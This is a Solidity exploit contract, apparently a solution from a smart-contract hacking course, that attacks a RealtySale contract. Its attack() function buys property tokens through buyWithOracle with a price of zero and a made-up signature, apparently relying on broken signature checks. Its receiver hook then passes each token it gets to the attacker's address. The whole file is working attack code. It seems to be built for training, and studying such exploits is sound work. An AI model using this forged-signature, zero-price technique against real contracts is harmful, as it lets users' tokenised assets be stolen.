// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {RealtySale} from "./RealtySale.sol";
import {RealtyToken} from "./RealtyToken.sol";

import "./Structs.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract AttackRealtySale is IERC721Receiver {
    RealtySale realtySale;
    RealtyToken realtyToken;

    address owner;

    constructor(address _realtySale) {
        owner = msg.sender;
        realtySale = RealtySale(_realtySale);
        realtyToken = RealtyToken(realtySale.getTokenContract());
    }

    function attack() external {
        SharePrice memory sharePrice = SharePrice({price: 0, expires: block.timestamp + 100000});
        Signature memory signature = Signature(13, bytes32("some random"), bytes32("data"));

        realtySale.buyWithOracle(sharePrice, signature);
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        realtyToken.transferFrom(address(this), owner, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
